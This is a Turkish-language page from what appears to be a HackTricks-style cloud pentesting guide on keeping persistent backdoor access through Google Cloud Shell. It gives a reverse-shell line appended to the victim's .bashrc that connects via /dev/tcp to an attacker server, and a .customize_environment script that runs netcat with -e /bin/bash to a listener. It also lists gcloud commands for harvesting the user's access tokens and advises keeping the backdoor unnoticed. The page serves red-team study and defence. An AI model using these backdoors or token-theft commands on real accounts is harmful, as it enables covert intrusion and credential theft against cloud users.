# GCP - Cloud Shell Sürekliliği

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Daha fazla bilgi için kontrol edin:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Sürekli Arka Kapı

[**Google Cloud Shell**](https://cloud.google.com/shell/) size tarayıcınızdan doğrudan bulut kaynaklarınıza komut satırı erişimi sağlar ve bununla ilgili herhangi bir maliyet yoktur.

Google'ın Cloud Shell'ine **web konsolu** üzerinden veya **`gcloud cloud-shell ssh`** komutunu çalıştırarak erişebilirsiniz.

Bu konsolun saldırganlar için bazı ilginç yetenekleri vardır:

1. **Google Cloud'a erişimi olan herhangi bir Google kullanıcısı**, tamamen kimlik doğrulamalı bir Cloud Shell örneğine erişim sağlar (Hizmet Hesapları, organizasyonun Sahipleri bile olsa erişebilir).
2. Bahsedilen örnek, **hiçbir etkinlik gerçekleşmezse en az 120 gün boyunca** ana dizinini koruyacaktır.
3. Bu örneğin etkinliğini **izleme yeteneği yoktur**.

Bu, temelde bir saldırganın kullanıcının ana dizinine bir arka kapı koyabileceği ve kullanıcı her 120 günde en az bir kez GC Shell'e bağlandığı sürece, arka kapının hayatta kalacağı ve saldırganın her çalıştırıldığında bir shell alacağı anlamına gelir.
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
Ev dizininde, kullanıcı **cloud shell**'e eriştiğinde **her seferinde** **çalıştırılacak** olan başka bir dosya olan **`.customize_environment`** bulunmaktadır (önceki teknikte olduğu gibi). Kullanıcı "sık sık" cloud shell'i kullandığı sürece kalıcılığı sağlamak için önceki arka kapıyı veya aşağıdakine benzer bir arka kapıyı ekleyin:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
> [!WARNING]
> **Kimlik doğrulama gerektiren bir eylem gerçekleştirildiğinde**, kullanıcının tarayıcısında bir onay penceresi açılır. Bu pencerenin kabul edilmesi, komutun çalışabilmesi için gereklidir. Beklenmedik bir pop-up görünürse, bu şüphe uyandırabilir ve kullanılan kalıcılık yöntemini tehlikeye atabilir.

Bu, bulut shell'den (saldırgan olarak) `gcloud projects list` komutunu çalıştırdığınızda tarayıcıda görülen pop-up'tır:

<figure><img src="../../../images/image (10).png" alt=""><figcaption></figcaption></figure>

Ancak, kullanıcı bulut shell'i aktif olarak kullandıysa, pop-up görünmeyecek ve **kullanıcının token'larını toplayabilirsiniz**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSH bağlantısının nasıl kurulduğu

Temelde, bu 3 API çağrısı kullanılır:

- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (yerel olarak oluşturduğunuz genel anahtarınızı eklemenizi sağlar)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (örneği başlatmanızı sağlar)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (google cloud shell'in ip'sini bildirir)

Ancak daha fazla bilgi bulabilirsiniz [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Referanslar

- [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
- [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
- [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{{#include ../../../banners/hacktricks-training.md}}
